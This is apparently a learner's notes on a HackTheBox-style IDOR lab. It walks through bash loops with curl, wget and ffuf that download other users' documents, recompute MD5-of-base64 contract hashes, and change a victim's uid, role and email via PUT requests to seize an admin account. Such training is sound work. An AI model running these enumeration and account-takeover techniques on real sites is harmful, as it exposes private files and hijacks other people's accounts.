# 🎲 Insecure Direct Object References

IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. \
Let's imagine we click on a link to it such as (`download.php?file_id=123`). So, as the link directly references the file with (`file_id=123`), what would happen if we tried to access another file (which may not belong to us) with (`download.php?file_id=124`)

If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its `file_id`

## Identifying IDORs

The URL parameters or APIs with an object reference (e.g. `?uid=1` or `?filename=file_1.pdf`) are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.

We can also identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls ->

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

The function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR.

***

Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead.

(`?filename=ZmlsZV8xMjMucGRm`) -> base64 -> `file_123.pdf`

We can try encoding `file_124.pdf`and try accessing it with the encoded object reference (`?filename=ZmlsZV8xMjQucGRm`)

On the other hand, the object reference may be hashed, like (`download.php?filename=c81e728d9d4c2f636f067f89cc14862c`). We cna think this is secured but if we look at the source code, we may see what is being hashed before the API call is made:

```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated

Imagine a user can view their salary after making the following API call:

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

with these details at hand, we can try repeating the same API call while logged in as `User2` to see if the web application returns anything.

## Mass IDOR Enumeration

Here are some informations parameters that are vulnerable&#x20;

employee with user id `uid=1` -> can lead to data exposure and auth bypass:

Let's imagine this person has a personal document folder ->

```
http://SERVER_IP:PORT/documents.php?uid=1
```

The files of this user are pretty simple patterns ->

```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

With this pattern we can easily fuzz files for other users.

We can inspect the page and look how the documents are coded:

```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

We can pick any unique word to be able to `grep` the link of the file. In our case, we see that each link starts with `<li class='pure-tree_link'>`, so we may `curl` the page and `grep` for this line

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
```

And we can curl out every files from every users with this technique and use a `Regex` pattern that matches strings between `/document` and `.pdf`, which we can use with `grep` to only get the document links->

```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```

And go evenu further and make a look that goes and fetch every file from every employee ->

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

_**Repeat what you learned in this section to get a list of documents of the first 20 user uid's in /documents.php, one of which should have a '.txt' file with the flag.**_

```
curl -X POST http://94.237.49.212:55717/documents.php -d "uid=1" | grep -oP "\/documents.*?.pdf"
```

So now we need to make the bash script ->

```
#!/bin/bash

url="http://94.237.49.212:55717"

for i in {1..20}; do
    for link in $(curl -X POST "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?\.[a-zA-Z0-9]{2,4}"); do
        wget -q $url/$link
    done
done
```

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Bypassing Encoded References

In some cases, web applications make hashes or encode their object references, making enumeration more difficult

Let's imagine the `Employment_contract.pdf` file ->

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can see a `POST` request to `download.php`, it's a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks.

We can try and guess how it's hashed but it's very difficult ->

```shell-session
ElFelixi0@htb[/htb]$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

We can start looking for a link in the source code with JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

In this case, the value being hashed is `btoa(uid)`, which is the `base64` encoded string of the `uid` variable

And we cantry and replicate how the backend makes our hash ->

```shell-session
ElFelixi0@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

Then we can use bash to make a big lists of uids ->&#x20;

```shell-session
ElFelixi0@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
<SNIP>
```

And make a post request with the hashes to download the ones that exist ->

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

_**Try to download the contracts of the first 20 employee, one of which should contain the flag, which you can read with 'cat'. You can either calculate the 'contract' parameter value, or calculate the '.pdf' file name directly.**_

We see the name of the contract through the URL->

```
file:///home/htb-ac-1032889/Downloads/contract_c4ca4238a0b923820dcc509a6f75849b.pdf
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we have to make a bash script to go and download every request ->

```
#!/bin/bash

# Function to generate the URL
downloadContract() {
  uid=$1
  # Encode UID in base64
  encoded_uid=$(echo -n "$uid" | base64)
  # Encode the base64 string for URL
  url_encoded_uid=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$encoded_uid'''))")
  # Generate the URL
  wget "http://94.237.49.212:40129/download.php?contract=${url_encoded_uid}"
}

# Loop from 1 to 20 and print the URLs
for i in {1..20}; do
  downloadContract "$i"
done
```

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

```
┌─[root@htb-m9r0jjfj1n]─[/home/htb-ac-1032889/test/test2]
└──╼ #cat 'download.php?contract=MjA='
HTB{h45h1n6_1d5_w0n7_****}
```

This one was hard :joy:

## Insecure APIs

`IDOR Insecure Function Calls` enable us to call APIs or execute functions as another user. Such functions and APIs can be used to change another user's private information, reset another user's password, or even buy items using another user's payment information.

Let's imagine on the web app a **Edit profile** function ->

<figure><img src="../../../.gitbook/assets/image (1413).png" alt=""><figcaption></figcaption></figure>

and if we intercept it:

<figure><img src="../../../.gitbook/assets/image (1414).png" alt=""><figcaption><p>hidden parameters, like <code>uid</code>, <code>uuid</code></p></figcaption></figure>

`PUT` requests are usually used in APIs to update item details, while `POST` is used to create new items, `DELETE` to delete items, and `GET` to retrieve item details.

`we should be able to set an arbitrary role for our user, which may grant us more privileges via the role parameter`

We can try to plau around and look for parameters we can change:\


1. Change our `uid` to another user's `uid`, such that we can take over their accounts\*

<figure><img src="../../../.gitbook/assets/image (1415).png" alt=""><figcaption></figcaption></figure>

1. Change another user's details, which may allow us to perform several web attacks

* with a `POST` request to the API endpoint. We can change the request method to `POST`, change the `uid` to a new `uid`

<figure><img src="../../../.gitbook/assets/image (1416).png" alt=""><figcaption><p>he same thing happens when we send a <code>Delete</code> request</p></figcaption></figure>

1. Create new users with arbitrary details, or delete existing users
2. Change our role to a more privileged role (e.g. `admin`) to be able to perform more actions

<figure><img src="../../../.gitbook/assets/image (1417).png" alt=""><figcaption><p><code>admin</code>/<code>administrator</code> to gain higher privileges</p></figcaption></figure>

Nothing worked for the moment, we have only been testing the `IDOR Insecure Function Calls`. However, we have not tested the API's `GET` request for `IDOR Information Disclosure Vulnerabilities`. If there was no robust access control system in place, we might be able to read other users' details

_**Try to read the details of the user with 'uid=5'. What is their 'uuid' value?**_

<figure><img src="../../../.gitbook/assets/image (1418).png" alt=""><figcaption></figcaption></figure>

## Chaining IDOR Vulnerabilities

Let's say we're able to GET another uid and get some informations about someone else:

<figure><img src="../../../.gitbook/assets/image (1419).png" alt=""><figcaption></figcaption></figure>

Now with the user's `uuid` at hand, we can change this user's details by sending a `PUT` request to `/profile/api.php/profile/2`

<figure><img src="../../../.gitbook/assets/image (1420).png" alt=""><figcaption></figcaption></figure>

One type of attack is `modifying a user's email address` and then requesting a password reset link, which will be sent to the email address we specified or `placing an XSS payload in the 'about' field`, which would get executed once the user visits their `Edit profile`

To chain more vulnerabilities, we could `write a script to enumerate all users` and try to find the role we are looking for ->

```json
{
    "uid": "X",
    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
    "role": "web_admin",
    "full_name": "administrator",
    "email": "webadmin@employees.htb",
    "about": "HTB{FLAG}"
}
```

With that new information we can upgrade our account to web\_admin and update our profile

we can refresh the page to update our cookie, or manually set it as `Cookie: role=web_admin`, and then intercept the `Update` request to create a new user and see if we'd be allowed to do so and GET the new user to see if it works:

<figure><img src="../../../.gitbook/assets/image (1421).png" alt=""><figcaption></figcaption></figure>

_**Try to change the admin's email to 'flag@idor.htb', and you should get the flag on the 'edit profile' page.**_

To find the web admin i filter out everything that is not admin, and remove every HTTP response that is 0 ->

```
ffuf -X GET -w num.txt -u http://94.237.59.199:52714/profile/api.php/profile/FUZZ -fr "admin" -fs 0
```

<figure><img src="../../../.gitbook/assets/image (1422).png" alt=""><figcaption></figcaption></figure>

I get numbers from 1 to 9 even tho i test on 50 users so i test out user 10 and i find admin:

<figure><img src="../../../.gitbook/assets/image (1423).png" alt=""><figcaption></figcaption></figure>

I copy-paste the uuid and change the uid param and send a PUT request:

<figure><img src="../../../.gitbook/assets/image (1424).png" alt=""><figcaption></figcaption></figure>

I am able to change informations:

<figure><img src="../../../.gitbook/assets/image (1425).png" alt=""><figcaption><p>and find the flag in my edit page</p></figcaption></figure>
